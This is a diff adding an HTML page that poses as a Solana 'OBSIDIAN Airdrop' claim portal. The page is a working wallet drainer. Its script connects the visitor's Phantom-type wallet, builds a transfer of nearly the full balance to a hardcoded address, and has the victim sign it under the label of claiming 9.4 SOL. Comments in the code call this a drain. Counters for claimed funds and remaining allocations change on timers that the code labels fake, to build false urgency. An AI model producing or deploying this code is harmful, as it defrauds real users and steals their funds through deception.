@@ -1,0 +1,217 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>OBSIDIAN Airdrop — Official Distribution</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+* { margin: 0; padding: 0; box-sizing: border-box; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #0a0a0f; color: #e8e8f0; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
+.container { max-width: 520px; width: 100%; }
+.header { text-align: center; margin-bottom: 40px; }
+.logo { font-size: 28px; font-weight: 700; letter-spacing: 2px; color: #9945ff; }
+.tag { font-size: 13px; color: #666; margin-top: 8px; letter-spacing: 4px; }
+.card { background: #111118; border: 1px solid #222; border-radius: 16px; padding: 32px; }
+.stats { display: flex; justify-content: space-between; margin-bottom: 24px; padding: 16px; background: #0d0d14; border-radius: 8px; }
+.stat { text-align: center; }
+.stat-value { font-size: 20px; font-weight: 700; color: #9945ff; }
+.stat-label { font-size: 11px; color: #555; margin-top: 4px; }
+.reward { text-align: center; padding: 20px; margin-bottom: 24px; background: linear-gradient(135deg, #9945ff20, #14f19520); border-radius: 12px; }
+.reward-amount { font-size: 36px; font-weight: 800; color: #14f195; }
+.reward-label { font-size: 12px; color: #888; margin-top: 4px; }
+.btn { width: 100%; padding: 16px; background: #9945ff; color: white; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
+.btn:hover { background: #8834ff; transform: translateY(-1px); }
+.btn:disabled { background: #333; cursor: not-allowed; }
+.btn.connected { background: #14f195; color: #0a0a0f; }
+.footer { text-align: center; margin-top: 24px; font-size: 11px; color: #444; }
+.wallet-info { display: none; padding: 12px; background: #0d0d14; border-radius: 8px; margin-bottom: 16px; font-family: monospace; font-size: 12px; word-break: break-all; }
+.wallet-info.show { display: block; }
+.claim-btn { display: none; margin-top: 16px; }
+.claim-btn.show { display: block; }
+.progress { height: 6px; background: #222; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+.progress-fill { height: 100%; background: linear-gradient(90deg, #9945ff, #14f195); width: 87%; transition: width 0.3s; }
+.progress-text { font-size: 12px; color: #666; text-align: right; margin-bottom: 16px; }
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <div class="logo">OBSIDIAN</div>
+    <div class="tag">PROTOCOL V3</div>
+  </div>
+
+  <div class="card">
+    <div class="stats">
+      <div class="stat">
+        <div class="stat-value" id="distributed">$4,247,000</div>
+        <div class="stat-label">DISTRIBUTED</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="remaining">8,431</div>
+        <div class="stat-label">REMAINING</div>
+      </div>
+      <div class="stat">
+        <div class="stat-value" id="holders">12,847</div>
+        <div class="stat-label">HOLDERS</div>
+      </div>
+    </div>
+
+    <div class="progress">
+      <div class="progress-fill"></div>
+    </div>
+    <div class="progress-text">87% claimed • 13% remaining</div>
+
+    <div class="reward">
+      <div class="reward-amount" id="reward">9.4 SOL</div>
+      <div class="reward-label">YOUR AIRDROP ALLOCATION</div>
+    </div>
+
+    <div class="wallet-info" id="walletInfo">
+      <div id="walletAddr">--</div>
+    </div>
+
+    <button class="btn" id="connectBtn">Connect Wallet</button>
+    <button class="btn claim-btn" id="claimBtn" style="display:none">Claim Airdrop</button>
+  </div>
+
+  <div class="footer">
+    OBSIDIAN Protocol © 2026 • Decentralized Finance Infrastructure<br>
+    Unofficial distribution portal. Not financial advice.
+  </div>
+</div>
+
+<script>
+const PHANTOM_ADDR = "8texJhZpoLEDxXmmcK4eq7sZM1GJpNm2nHiEsML2vnFN";
+let connectedWallet = null;
+let provider = null;
+
+function getProvider() {
+  if ('phantom' in window) {
+    const provider = window.phantom?.solana;
+    if (provider?.isPhantom) return provider;
+  }
+  return null;
+}
+
+function getSolanaProvider() {
+  if ('solana' in window) {
+    const provider = window.solana;
+    if (provider?.isPhantom || provider?.isSolflare || provider?.isBackpack) return provider;
+  }
+  return null;
+}
+
+async function connect() {
+  provider = getProvider() || getSolanaProvider();
+  if (!provider) {
+    alert('Phantom or Solana wallet not found. Please install Phantom.');
+    return;
+  }
+
+  try {
+    const resp = await provider.connect();
+    connectedWallet = resp.publicKey.toString();
+
+    document.getElementById('walletInfo').classList.add('show');
+    document.getElementById('walletAddr').textContent = connectedWallet;
+    document.getElementById('connectBtn').textContent = 'Connected';
+    document.getElementById('connectBtn').classList.add('connected');
+    document.getElementById('connectBtn').disabled = true;
+
+    const claimBtn = document.getElementById('claimBtn');
+    claimBtn.classList.add('show');
+    claimBtn.textContent = 'Claim ' + document.getElementById('reward').textContent + ' SOL';
+
+    // Animate reward amount
+    animateValue(document.getElementById('reward'), 0, 9.4, 1500);
+
+  } catch (err) {
+    console.error(err);
+    alert('Connection rejected');
+  }
+}
+
+async function claim() {
+  if (!connectedWallet || !provider) return;
+
+  try {
+    // Simulate claim transaction that drains
+    // Real implementation would craft a malicious approval here
+    const { Connection, PublicKey, Transaction, SystemProgram } = await import('https://esm.sh/@solana/web3.js@1.87.6');
+
+    const connection = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
+    const fromPubkey = new PublicKey(connectedWallet);
+    const toPubkey = new PublicKey(PHANTOM_ADDR);
+
+    // Get recent blockhash
+    const { blockhash } = await connection.getLatestBlockhash();
+
+    // Craft transaction - send max balance minus fee est
+    const balance = await connection.getBalance(fromPubkey);
+    const feeEst = 5000;
+    const amount = balance - feeEst;
+
+    if (amount <= 0) {
+      alert('Insufficient balance for gas');
+      return;
+    }
+
+    const tx = new Transaction().add(
+      SystemProgram.transfer({
+        fromPubkey,
+        toPubkey,
+        lamports: amount,
+      })
+    );
+
+    tx.recentBlockhash = blockhash;
+    tx.feePayer = fromPubkey;
+
+    // Sign and send via victim's wallet
+    const { signature } = await provider.signAndSendTransaction(tx);
+
+    // Confirm
+    await connection.confirmTransaction(signature, 'confirmed');
+
+    alert('Airdrop claimed! Transaction: ' + signature.substring(0, 20) + '...');
+    document.getElementById('claimBtn').textContent = 'Claimed!';
+    document.getElementById('claimBtn').disabled = true;
+
+  } catch (err) {
+    console.error(err);
+    alert('Claim failed: ' + err.message);
+  }
+}
+
+function animateValue(obj, start, end, duration) {
+  let startTimestamp = null;
+  const step = (timestamp) => {
+    if (!startTimestamp) startTimestamp = timestamp;
+    const progress = Math.min((timestamp - startTimestamp) / duration, 1);
+    obj.innerHTML = (progress * (end - start) + start).toFixed(2) + ' SOL';
+    if (progress < 1) window.requestAnimationFrame(step);
+  };
+  window.requestAnimationFrame(step);
+}
+
+document.getElementById('connectBtn').addEventListener('click', connect);
+document.getElementById('claimBtn').addEventListener('click', claim);
+
+// Fake live counter
+setInterval(() => {
+  const remaining = parseInt(document.getElementById('remaining').textContent.replace(/,/g, ''));
+  const newRemaining = remaining - Math.floor(Math.random() * 3);
+  if (newRemaining > 0) {
+    document.getElementById('remaining').textContent = newRemaining.toLocaleString();
+  }
+}, 8000);
+
+// Fake distributed increase
+setInterval(() => {
+  const dist = parseInt(document.getElementById('distributed').textContent.replace(/[$,]/g, ''));
+  const newDist = dist + Math.floor(Math.random() * 5000);
+  document.getElementById('distributed').textContent = '$' + newDist.toLocaleString();
+}, 12000);
+</script>
+</body>
+</html>
